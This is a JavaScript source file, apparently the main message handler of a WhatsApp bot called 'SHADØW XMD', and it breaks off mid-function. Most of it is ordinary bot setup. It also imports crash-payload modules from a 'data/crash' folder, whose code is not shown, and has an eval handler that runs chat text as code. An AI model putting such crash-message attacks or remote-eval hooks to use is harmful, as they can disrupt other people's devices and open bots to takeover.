require('./lib/lowdb/adapters/settings')
require('./config')
const {
	downloadContentFromMessage
} = require('baileys')
const { modul } = require('./module')
const { getUptime, setAntideleteEnabled, getAntideleteEnabled, setAutotyping, getAutotypingStatus, setAutoRecording, getAutoViewStatus, setAutoViewStatus, getAutoRecordingStatus, setAutoBlockMorocco, getAutoBlockMoroccoStatus, setAutoKickMorocco, getAutoKickMoroccoStatus, setAntispam, getAntispamStatus, setSelfMode, getSelfModeStatus, setPublicMode, getPublicModeStatus } = require('./lib/uptime');
const JsConfuser = require('js-confuser');
const { os, axios, baileys, chalk, cheerio, child_process, crypto, cookie, FormData, FileType, fetch, fs, fsx, ffmpeg, Jimp, jsobfus, PhoneNumber, process, moment, ms, speed, syntaxerror, util, ytdl, googleTTS, nodecron, maker } = modul
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, generateForwardMessageContent } = baileys
const { clockString, parseMention, formatp, tanggal, getTime, isUrl, sleep, runtime, fetchJson, getBuffer, jsonformat, format, reSize, generateProfilePicture, getRandom } = require('./lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
const myfunc = require('./lib/myfunc'); // Adjust the path if 'myfunc.js' is in a different folder
const salam = moment(Date.now()).tz('Africa/Lagos').locale('id').format('a')
const { isSetWelcome, addSetWelcome, changeSetWelcome, removeSetWelcome } = require('./lib/setwelcome');
const { Primbon } = require('scrape-primbon')
const { youtubedl, youtubedlv2 } = require('@bochilteam/scraper-sosmed');
const { chatGpt, ytMp4, ytMp3 } = require('./lib/scraper');
const primbon = new Primbon()
const canvafy = require('canvafy')
const { isSetLeft, addSetLeft, removeSetLeft, changeSetLeft } = require('./lib/setleft');
const imageBuffer = fs.readFileSync('./data/image/thumb.jpg')
const { getTextSetWelcome } = require('./lib/setwelcome');
const { getTextSetLeft } = require('./lib/setleft');
const { color, bgcolor } = require('./lib/color')
const { TelegraPh } = require('./lib/uploader')
const { protocolbug5 } = require('./data/crash/voltcrash.js');
const { BlankInvite } = require('./data/crash/sparked.js'); 
const { bak2, bak2Group } = require('./data/crash/death'); 
const { IosCL } = require('./data/crash/voltios.js');
const { fetchBuffer, buffermagef } = require("./lib/myfunc2")
const { uptotelegra } = require('./scrape/upload')
const { Sticker, StickerTypes } = require('wa-sticker-formatter')
const JavaScriptObfuscator = require('javascript-obfuscator');
const fg = require('api-dylux')
const { msgFilter } = require('./lib/antispam')
const { ytDonlodMp3, ytDonlodMp4, ytPlayMp3, ytPlayMp4, ytSearch } = require('./scrape/yt')
const {
    toAudio
} = require('./lib/converter');
const scp1 = require('./scrape/scraper') 
const scp2 = require('./scrape/scraperr')
const scp3 = require('./scrape/scraperrr')
const githubstalk = require('./scrape/githubstalk')
const npmstalk = require('./scrape/npmstalk')
const photooxy = require('./scrape/photooxy')
const yts = require('./scrape/yt-search')
const vm = require('node:vm')
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const dansyaverifikasiuser = JSON.parse(fs.readFileSync('./database/user.json'))
const NanoVoiceNote = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/database/xeonvn.json'))
const NanoSticker = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/database/xeonsticker.json'))
const ImageNano = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/database/xeonimage.json'))
const VideoNano = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/database/xeonvideo.json'))
const BadNano = JSON.parse(fs.readFileSync('./database/bad.json'))
const pler = JSON.parse(fs.readFileSync('./database/idgrup.json').toString())
const siminya = JSON.parse(fs.readFileSync('./database/simi.json'))
  
  const yourid = '2348126003566@s.whatsapp.net'; // Your WhatsApp ID 
const channelContextInfo = {
  forwardingScore: 0,
  isForwarded: true,
  forwardedNewsletterMessageInfo: {
    newsletterJid: '120363400964601488@newsletter',
    newsletterName: '[𝐒𝐀𝐌𝐒𝐔𝐍𝐆_𝐗𝐌𝐃]'
  },
};
const chatnano = JSON.parse(fs.readFileSync('./database/chatnano.json'))
const { isSetProses, addSetProses, removeSetProses, changeSetProses, getTextSetProses } = require('./lib/setproses');
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/respon-list');
const { isSetDone, addSetDone, removeSetDone, changeSetDone, getTextSetDone } = require('./lib/setdone');
let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'))
let mute = JSON.parse(fs.readFileSync('./database/mute.json'));
let ntnsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'))
let ntvirtex = JSON.parse(fs.readFileSync('./database/antivirus.json'))
let _cmd = JSON.parse(fs.readFileSync('./database/command.json'));
let _cmdUser = JSON.parse(fs.readFileSync('./database/commandUser.json'));
let nttoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'))
let ntwame = JSON.parse(fs.readFileSync('./database/antiwame.json'))
let ntlinkgc =JSON.parse(fs.readFileSync('./database/antilinkgc.json'))
let ntilinkall =JSON.parse(fs.readFileSync('./database/antilinkall.json'))
let ntilinktwt =JSON.parse(fs.readFileSync('./database/antilinktwitter.json'))
let ntilinktt =JSON.parse(fs.readFileSync('./database/antilinktiktok.json'))
let ntilinktg =JSON.parse(fs.readFileSync('./database/antilinktelegram.json'))
let ntilinkfb =JSON.parse(fs.readFileSync('./database/antilinkfacebook.json'))
let ntilinkig =JSON.parse(fs.readFileSync('./database/antilinkinstagram.json'))
let ntilinkytch =JSON.parse(fs.readFileSync('./database/antilinkytchannel.json'))
let ntilinkytvid =JSON.parse(fs.readFileSync('./database/antilinkytvideo.json'))
let openaigc = JSON.parse(fs.readFileSync('./database/openaigc.json'))
let _welcome = JSON.parse(fs.readFileSync('./database/welcome.json'))
let _left = JSON.parse(fs.readFileSync('./database/left.json'))
let set_proses = JSON.parse(fs.readFileSync('./database/set_proses.json'))
let set_done = JSON.parse(fs.readFileSync('./database/set_done.json'))
let db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));
global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db || {})
}

// read database
let tebaklagu = []
let _family100 = []
let kuismath = []
let tebakgambar = []
let tebakkata = []
let transactionDetails = {};
let caklontong = []
let caklontong_desk = []
let tebakkalimat = []
let tebaklirik = []
let tebaktebakan = []
let tebakbendera = []
let tebakbendera2 = []
let tebakkabupaten = []
let tebakkimia = []
let tebakasahotak = []
let tebaksiapakahaku = []
let tebaksusunkata = []
let tebaktekateki = []
let vote = db.others.vote = []

module.exports = LordVoltage = async (LordVoltage, m, chatUpdate, store) => {
try {
                const { type, quotedMsg, mentioned, now, fromMe } = m; // 'type' is correctly destructured here.

        // --- CONSOLIDATED AND ROBUST MESSAGE TEXT PARSING ---
        // 'budy' is now defined FIRST, ensuring it's accessible by 'body' and other variables.
        const budy = (m.mtype === 'conversation' && m.message?.conversation) ? m.message.conversation :
                     (m.mtype === 'imageMessage' && m.message?.imageMessage?.caption) ? m.message.imageMessage.caption :
                     (m.mtype === 'videoMessage' && m.message?.videoMessage?.caption) ? m.message.videoMessage.caption :
                     (m.mtype === 'extendedTextMessage' && m.message?.extendedTextMessage?.text) ? m.message.extendedTextMessage.text :
                     (m.mtype === 'buttonsResponseMessage' && m.message?.buttonsResponseMessage?.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId :
                     (m.mtype === 'listResponseMessage' && m.message?.listResponseMessage?.singleSelectReply?.selectedRowId) ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
                     (m.mtype === 'templateButtonReplyMessage' && m.message?.templateButtonReplyMessage?.selectedId) ? m.message.templateButtonReplyMessage.selectedId :
                     (m.mtype === 'interactiveResponseMessage' && m.msg?.nativeFlowResponseMessage?.paramsJson) ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
                     (m.mtype === 'templateButtonReplyMessage' && m.msg?.selectedId) ? m.msg.selectedId :
                     (m.mtype === 'messageContextInfo') ? (m.message?.buttonsResponseMessage?.selectedButtonId || m.message?.listResponseMessage?.singleSelectReply?.selectedRowId || m.text) :
                     ''; // Default to an empty string to prevent null/undefined errors.

        // 'body' is now correctly defined AFTER 'budy', resolving the ReferenceError.
        const body = budy;

                     '';
        //prefix 1
const prefix = /^\./.test(body) ? '.' : ''; 
async function appenTextMessage(text, chatUpdate) {
let messages = await generateWAMessage(m.chat, { text: text, mentions: m.mentionedJid }, {
userJid: LordVoltage.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, LordVoltage.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
//LordVoltage.ev.emit('messages.upsert', msg)
}
         
                const chath = budy;
                const pes = budy;

        const messagesC = pes.slice(0).trim()
        const content = JSON.stringify(m.message)
        const isCmd = typeof budy === 'string' && budy.startsWith(prefix) ? true : false;
        const from = m.key.remoteJid
        const messagesD = typeof budy === 'string' ? budy.slice(0).trim().split(/ +/).shift().toLowerCase() : '';
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await LordVoltage.decodeJid(LordVoltage.user.id)
const DanzTheCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime)
const isImage = (type == 'imageMessage')
const isVideo = (type == 'videoMessage')
const isAudio = (type == 'audioMessage')
const isSticker = (type == 'stickerMessage')
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')
const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const senderNumber = sender.split('@')[0]

// --- CRITICAL CHANGE FOR GROUP METADATA AND ADMINS (Complete Block - Cleaned) ---
let groupMetadata = null;
let participants = [];
let groupAdmins = [];
let groupOwner = '';
let groupMembers = [];
let isBotAdmins = false;
let isGroupAdmins = false;
let isAdmins = false; // Keeping this for consistency if you use it elsewhere
let groupName = ''; // Initialize groupName here

if (m.isGroup) {
    try {
        groupMetadata = await LordVoltage.groupMetadata(m.chat);
        participants = groupMetadata.participants;

        // Logic for filtering and mapping admins to JIDs
        groupAdmins = participants
            .filter(v => v.admin === 'admin') // Filter for actual admins (where 'admin' property is 'admin' string)
            .map(v => {
                // PRIORITIZE JID IF AVAILABLE (as 'jid' property or if 'id' is already JID)
                const participantId = v.jid || v.id; 

                // Ensure the ID is in the standard JID format for consistent comparison
                if (participantId.endsWith('@lid')) {
                    return participantId.replace(/@lid$/, '@s.whatsapp.net');
                }
                return participantId; 
            });

        groupOwner = groupMetadata.owner;
        groupMembers = groupMetadata.participants;

        // Ensure botNumber is also in @s.whatsapp.net format for comparison
        const formattedBotNumber = botNumber.includes('@s.whatsapp.net') ? botNumber : botNumber.split('@')[0] + '@s.whatsapp.net'; 
        
        // Now, compare JIDs for admin status
        isBotAdmins = groupAdmins.includes(formattedBotNumber);
        isGroupAdmins = groupAdmins.includes(m.sender); // m.sender is JID, groupAdmins should now be JIDs
        isAdmins = isGroupAdmins; // Keep this consistent if you use isAdmins elsewhere
        groupName = groupMetadata.subject;
    } catch (e) {
        console.error("Error fetching group metadata:", e);
        // If metadata fetching fails, these variables will remain as their initial empty/false values
    }
}
// --- END CRITICAL CHANGE FOR GROUP METADATA AND ADMINS ---

const jangan = m.isGroup ? pler.includes(m.chat) : false
const isPrem = prem.includes(m.sender)
const isUser = dansyaverifikasiuser.includes(sender)
const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
   	        const mentionByTag = type == 'extendedTextMessage' && m.message?.extendedTextMessage?.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : [];
                const mentionByReply = type == 'extendedTextMessage' && m.message?.extendedTextMessage?.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : '';
                const numberQuery = (q ? String(q).replace(new RegExp('[()+-/ +/]', 'gi'), '') : '') + '@s.whatsapp.net';
        const usernya = mentionByReply ? mentionByReply : mentionByTag[0]
        const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
    	const isEval = body.startsWith('=>')
      const isAutoAiGc = m.isGroup ? openaigc.includes(m.chat) : true
      const isnanochat = m.isGroup ? chatnano.includes(m.chat) : true
      const shouldExit = true
      const automati = true
      const isAutosimi = m.isGroup ? siminya.includes(m.chat) : true
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        const isAutoSticker = m.isGroup ? autosticker.includes(from) : false        
        const Antilinkgc = m.isGroup ? ntlinkgc.includes(m.chat) : false
        const antibot = true
        const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(from) : false
        const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(from) : false
        const isMute= mute.includes(m.chat) ? true : false
        const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
        const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(from) : false
        const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(from) : false
        const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false
        const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false
        const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
        const antiWame = m.isGroup ? ntwame.includes(from) : false
        const antiToxic = m.isGroup ? nttoxic.includes(from) : true
const isWelcome = _welcome.includes(m.chat) ? true : false
const isLeft = _left.includes(m.chat) ? true : false
const isSimi = siminya.includes(m.chat) ? true : false 
const nanototalpitur = () =>{
            var mytext = fs.readFileSync("./shadow.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
        const hariini = moment.tz('Africa/Lagos').format('dddd, DD MMMM YYYY')
        const xdate = moment.tz('Africa/Lagos').format('dddd, DD MMMM YYYY')
        const time2 = moment.tz('Africa/Lagos').format('HH : mm : ss')
        const wit = moment.tz('Africa/Lagos').format('HH : mm : ss')
        const wita = moment.tz('Africa/Lagos').format('HH : mm : ss')
         if(time2 < "23:59:00"){
var nanoliatwaktu = `ʜɪ`
 }
 if(time2 < "19:00:00"){
var nanoliatwaktu = `ʜɪ`
 }
 if(time2 < "18:00:00"){
var nanoliatwaktu = `ʜɪ`
 }
 if(time2 < "15:00:00"){
var nanoliatwaktu = `ʜɪ`
 }
 if(time2 < "11:00:00"){
var nanoliatwaktu = `ʜɪ`
 }
 if(time2 < "05:00:00"){
var nanoliatwaktu = `ʜɪ`
 } 

let dt = moment(Date.now()).tz('Africa/Lagos').locale('id').format('a')
var fildt = dt == 'pagi' ? dt + '' : dt == 'siang' ? dt + '' : dt == 'sore' ? dt + '' : dt + ''
const ucapanTime = fildt.charAt(0).toUpperCase() + fildt.slice(1)

		if (isEval && senderNumber == "") {
			let evaled,
				text = q,
				{ inspect } = require('util')
			try {
				if (text.endsWith('--sync')) {
					evaled = await eval(
						`(async () => { ${text.trim.replace('--sync', '')} })`
					)
					reply(evaled)
				}
				evaled = await eval(text)
				if (typeof evaled !== 'string') evaled = inspect(evaled)
				await LordVoltage.sendMessage(from, { text: evaled }, { quoted: m })
			} catch (e) {
				LordVoltage.sendMessage(from, { text: String(e) }, { quoted: m })
			}
		}
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
const chats = global.db.chats[m.chat]
if (typeof chats !== 'object') global.db.chats[m.chat] = {

}
if (user) {
if (!isNumber(user.chip)) user.chip = 0
if (!isNumber(user.atm)) user.atm = 0
if (!isNumber(user.fullatm)) user.fullatm = 0
if (!isNumber(user.bank)) user.bank = 0
if (!isNumber(user.health)) user.health = 100
if (!isNumber(user.potion)) user.potion = 0
if (!isNumber(user.trash)) user.trash = 0
if (!isNumber(user.wood)) user.wood = 0
if (!isNumber(user.rock)) user.rock = 0
if (!isNumber(user.string)) user.string = 0
if (!isNumber(user.petfood)) user.petfood = 0
if (!isNumber(user.emerald)) user.emerald = 0
if (!isNumber(user.diamond)) user.diamond = 0
if (!isNumber(user.gold)) user.gold = 0
if (!isNumber(user.botol)) user.botol = 0
if (!isNumber(user.kardus)) user.kardus = 0
if (!isNumber(user.kaleng)) user.kaleng = 0
if (!isNumber(user.gelas)) user.gelas = 0
if (!isNumber(user.plastik)) user.plastik = 0
if (!isNumber(user.iron)) user.iron = 0
if (!isNumber(user.common)) user.common = 0
if (!isNumber(user.uncommon)) user.uncommon = 0
if (!isNumber(user.mythic)) user.mythic = 0
if (!isNumber(user.legendary)) user.legendary = 0
if (!isNumber(user.umpan)) user.umpan = 0
if (!isNumber(user.pet)) user.pet = 0
if (!isNumber(user.paus)) user.paus = 0
if (!isNumber(user.kepiting)) user.kepiting = 0
if (!isNumber(user.gurita)) user.gurita = 0
if (!isNumber(user.cumi)) user.cumi = 0
if (!isNumber(user.buntal)) user.buntal = 0
if (!isNumber(user.dory)) user.dory = 0
if (!isNumber(user.lumba)) user.lumba = 0
if (!isNumber(user.lobster)) user.lobster = 0
if (!isNumber(user.hiu)) user.hiu = 0
if (!isNumber(user.udang)) user.udang = 0
if (!isNumber(user.orca)) user.orca = 0
if (!isNumber(user.banteng)) user.banteng = 0
if (!isNumber(user.gajah)) user.gajah = 0
if (!isNumber(user.harimau)) user.harimau = 0
if (!isNumber(user.kambing)) user.kambing = 0
if (!isNumber(user.panda)) user.panda = 0
if (!isNumber(user.buaya)) user.buaya = 0
if (!isNumber(user.kerbau)) user.kerbau = 0
if (!isNumber(user.sapi)) user.sapi = 0
if (!isNumber(user.monyet)) user.monyet = 0
if (!isNumber(user.babihutan)) user.babihutan = 0
if (!isNumber(user.babi)) user.babi = 0
if (!isNumber(user.ayam)) user.ayam = 0

if (!isNumber(user.lastadventure)) user.lastadventure = 0
if (!isNumber(user.lastkill)) user.lastkill = 0
if (!isNumber(user.lastmisi)) user.lastmisi = 0
if (!isNumber(user.lastdungeon)) user.lastdungeon = 0
if (!isNumber(user.lastwar)) user.lastwar = 0
if (!isNumber(user.lastsda)) user.lastsda = 0
if (!isNumber(user.lastduel)) user.lastduel = 0
if (!isNumber(user.lastmining)) user.lastmining = 0
if (!isNumber(user.lasthunt)) user.lasthunt = 0
if (!isNumber(user.lastgift)) user.lastgift = 0
if (!isNumber(user.lastberkebon)) user.lastberkebon = 0
if (!isNumber(user.lastdagang)) user.lastdagang = 0
if (!isNumber(user.lasthourly)) user.lasthourly = 0
if (!isNumber(user.lastbansos)) user.lastbansos = 0
if (!isNumber(user.lastrampok)) user.lastrampok = 0
if (!isNumber(user.lastclaim)) user.lastclaim = 0
if (!isNumber(user.lastnebang)) user.lastnebang = 0
if (!isNumber(user.lastweekly)) user.lastweekly = 0
if (!isNumber(user.lastmonthly)) user.lastmonthly = 0
if (!isNumber(user.apel)) user.apel = 0
if (!isNumber(user.anggur)) user.anggur = 0
if (!isNumber(user.jeruk)) user.jeruk = 0
if (!isNumber(user.mangga)) user.mangga = 0
if (!isNumber(user.pisang)) user.pisang = 0
if (!isNumber(user.makanan)) user.makanan = 0
if (!isNumber(user.bibitanggur)) user.bibitanggur = 0
if (!isNumber(user.bibitpisang)) user.bibitpisang = 0
if (!isNumber(user.bibitapel)) user.bibitapel = 0
if (!isNumber(user.bibitmangga)) user.bibitmangga = 0
if (!isNumber(user.bibitjeruk)) user.bibitjeruk = 0
if (!isNumber(user.horse)) user.horse = 0
if (!isNumber(user.horseexp)) user.horseexp = 0
if (!isNumber(user.cat)) user.cat = 0
if (!isNumber(user.catexp)) user.catexp = 0
if (!isNumber(user.fox)) user.fox = 0
if (!isNumber(user.foxhexp)) user.foxexp = 0
if (!isNumber(user.dog)) user.foxexp = 0
if (!isNumber(user.dogexp)) user.dogexp = 0
if (!isNumber(user.robo)) user.robo = 0
if (!isNumber(user.roboexp)) user.roboexp = 0
if (!isNumber(user.horselastfeed)) user.horselastfeed = 0
if (!isNumber(user.catlastfeed)) user.catlastfeed = 0
if (!isNumber(user.robolastfeed)) user.robolastfeed = 0
if (!isNumber(user.foxlastfeed)) user.foxlastfeed = 0
if (!isNumber(user.doglastfeed)) user.doglastfeed = 0
if (!isNumber(user.robo)) user.robo = 0
if (!isNumber(user.robodurability)) user.robodurability = 0
if (!isNumber(user.armor)) user.armor = 0
if (!isNumber(user.armordurability)) user.armordurability = 0
if (!isNumber(user.sword)) user.sword = 0
if (!isNumber(user.sworddurability)) user.sworddurability = 0
if (!isNumber(user.pickaxe)) user.pickaxe = 0
if (!isNumber(user.pickaxedurability)) user.pickaxedurability = 0
if (!isNumber(user.fishingrod)) user.fishingrod = 0
if (!isNumber(user.fishingroddurability)) user.fishingroddurability = 0
if (!user.premium) user.premiumTime = 0
if (!('afkReason' in user)) user.afkReason = ''
if (!("premium" in user)) user.premium = true
} else global.db.users[m.sender] = {
afkTime: -1,
afkReason: '',
premiumTime: 0,
premium: true,
money: 100000,
exp: 0,
limit: 30,
freelimit: 0,
lastclaim: 0,
skata: 0,
registered: true,
name: m.name,
pc: 0,
joinlimit: 1,
age: -1,
regTime: -1,
unreg: false,
afk: -1,
afkReason: '',
banned: false,
bannedTime: 0,
warning: 0,
level: 0,
rokets: 0,
role: 'Beginner',
skill: '',
ojekk: 0,
WarnReason: '',
chip: 0,
bank: 0,
atm: 0,
fullatm: 0,
health: 100,
potion: 10,
trash: 0,
wood: 0,
rock: 0,
string: 0,
emerald: 0,
diamond: 0,
gold: 0,
iron: 0,
common: 0,
uncommon: 0,
mythic: 0,
legendary: 0,
umpan: 0,
pet: 0,
horse: 0,
horseexp: 0,
horselastfeed: 0,
cat: 0,
catexp: 0,
catlastfeed: 0,
fox: 0,
foxexp: 0,
foxlastfeed: 0,
robo: 0,
roboexp: 0,
robolastfeed: 0,
dog: 0,
dogexp: 0,
doglastfeed: 0,
paus: 0,
kepiting: 0,
gurita: 0,
cumi: 0,
buntal: 0,
dory: 0,
lumba: 0,
lobster: 0,
hiu: 0,
udang: 0,
ikan: 0,
orca: 0,
banteng: 0,
harimau: 0,
gajah: 0,
kambing: 0,
buaya: 0,
kerbau: 0,
sapi: 0,
monyet: 0,
babi: 0,
ayam: 0,
armor: 0,
armordurability: 0,
sword: 0,
sworddurability: 0,
pickaxe: 0,
pickaxedurability: 0,
fishingrod: 0,
fishingroddurability: 0,
robo: 0,
robodurability: 0,
Apple: 20,
Banana: 0,
Wine: 0,
Mango: 0,
Orange: 0,
lastadventure: 0,
lastkill: 0,
lastmisi: 0,
lastdungeon: 0,
lastwar: 0,
lastsda: 0,
lastduel: 0,
lastmining: 0,
lasthunt: 0,
lastgift: 0,
lastberkebon: 0,
lastdagang: 0,
lasthourly: 0,
lastbansos: 0,
lastrampok: 0,
lastclaim: 0,
lastnebang: 0,
lastweekly: 0,
lastmonthly: 0

}


 global.emojis =[ 
        "😀", "😁", "😂", "🤣", "😃", "😄", "😅", "😆", "😉", "😊",
        "😍", "😘", "😎", "🤩", "🤔", "😏", "😣", "😥", "😮", "🤐",
        "😪", "😫", "😴", "😌", "😛", "😜", "😝", "🤤", "😒", "😓",
        "😔", "😕", "🙃", "🤑", "😲", "😖", "😞", "😟", "😤", "😢",
        "😭", "😨", "😩", "🤯", "😬", "😰", "😱", "🥵", "🥶", "😳",
        "🤪", "😡", "😠", "🤬", "😷", "🤒", "🤕", "🤢", "🤮", "🤧",
        "😇", "🥳", "🤠", "🤡", "🤥", "🤫", "🤭", "🧐", "🤓", "😈",
        "👿", "👹", "👺", "💀", "👻", "👽", "👾", "🤖", "🎃", "😺",
        "😸", "😹", "😻", "😼", "😽", "🙀", "😿", "😾", "💋", "💌",
        "🎭", "💝", "💖", "💗", "💓", "💞", "💕", "👑", "💔", "❤️"
    ];
const setting = db.settings[botNumber]
        if (typeof setting !== 'object') db.settings[botNumber] = {}
	    if (setting) {
    	    if (!('anticall' in setting)) setting.anticall = false
    		if (!isNumber(setting.status)) setting.status = 0
    		if (!('autobio' in setting)) setting.autobio = false
        if (!('goodbye' in setting)) chats.goodbye = setting.auto_leaveMsg
        if (!('onlygrub' in setting)) setting.onlygrub = false
        if (!('onlypc' in setting)) setting.onlypc = false
        if (!('welcome' in setting)) chats.welcome = setting.auto_welcomeMsg
       if (!('onlygrub' in setting)) setting.onlygrub = false
	  } else global.db.settings[botNumber] = {
    	  anticall: false,
    		status: 0,
    		stock:10,
    		autobio: false,
    		auto_ai_grup: true,
    		goodbye: true,
        onlygrub: false,
        onlypc: false,
        welcome: true, 
    		autoread: false
	    }

} catch (err) {
console.error(err)
}

if (m.isGroup && isMute) {
if (!isAdmins && !DanzTheCreator) return
}
if (!getPublicModeStatus()) {
    if (DanzTheCreator || isPrem || m.sender === yourid) {

    } else {
        if (!m.key.fromMe) {
            return;
        }
    }
}
// auto message

//=========================================\\
//=========================================\\
//chat counter (console log)
if (m.message && m.isGroup) {
  const logColor = (text, colorName) => color(`┃${text}`, colorName);
  const line = color(
`══════════════════════════`, 'blue');
  const header = color(
`𓊈   SHADØW XMD VERSION 1 𓊉`, 'red');
  console.log(header);
  console.log(line);
  console.log(color(` 𝐆𝐫𝐨𝐮𝐩 𝐂𝐡𝐚𝐭... `, 'green'));
  console.log(logColor(`𓊈 𝐓𝐈𝐌𝐄 𓊉 : ${myfunc.getTime()}`, 'blue'));
  console.log(logColor(`𓊈 𝐍𝐀𝐌𝐄 𓊉 : ${pushname}`, 'red'));
  console.log(logColor(`𓊈 𝐆𝐑𝐎𝐔𝐏 𓊉 : ${groupName}`, 'green'));
  console.log(logColor(`𓊈𝐉𝐈𝐃𓊉 : ${m.chat}`, 'blue'));
  console.log(line);
  console.log(logColor(`𓊈 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𓊉 : ${budy || m.mtype}`, 'red'));
  console.log(logColor(`𓊈 𝐅𝐑𝐎𝐌 𓊉 : ${m.sender}`, 'green'));
  console.log(line);
} else {
  const logColor = (text, colorName) => color(`┃${text}`, colorName);
  const line = color(
`══════════════════════════`, 'blue');
  const header = color(
`𓊈   SHADØW XMD VERSION 1   𓊉`, 'red');
  console.log(header);
  console.log(line);
  console.log(color(` 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐂𝐡𝐚𝐭... `, 'green'));
  console.log(logColor(`𓊈 𝐓𝐈𝐌𝐄 𓊉 : ${myfunc.getTime()}`, 'blue'));
  console.log(logColor(`𓊈 𝐍𝐀𝐌𝐄 𓊉 : ${pushname}`, 'red'));
  console.log(logColor(`𓊈𝐉𝐈𝐃𓊉 : ${m.sender}`, 'green'));
  console.log(line);
  console.log(logColor(`𓊈 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𓊉 : ${budy || m.mtype}`, 'blue'));
  console.log(line);
}


if (isCmd && !isUser) {
dansyaverifikasiuser.push(sender)
fs.writeFileSync('./database/user.json', JSON.stringify(dansyaverifikasiuser, null, 2))
}

LordVoltage.sendPresenceUpdate('unavailable', from)

for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
reply(`Jangan Tag Dia!
Dia AFK ${reason ? 'With Reason: ' + reason : 'No Reason'}
During ${clockString(new Date - afkTime)}
`.trim())
}

//math
if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {

            kuis = true

            jawaban = kuismath[m.sender.split('@')[0]]

            if (budy.toLowerCase() == jawaban) {

await reply(`🎮 MATH QUIZ 🎮\there is no Correct Answer 🎉\and want to play again? Send ${prefix}math mode`)

delete kuismath[m.sender.split('@')[0]]

            } else reply('*WRONG ANSWER!*')

        }


//TicTacToe\\
	    this.game = this.game ? this.game : {}
	    let room13 = Object.values(this.game).find(room13 => room13.id && room13.game && room13.state && room13.id.startsWith('tictactoe') && [room13.game.playerX, room13.game.playerO].includes(m.sender) && room13.state == 'PLAYING')
	    if (room13) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    //reply(`[DEBUG]\n${parseInt(m.text)}`)
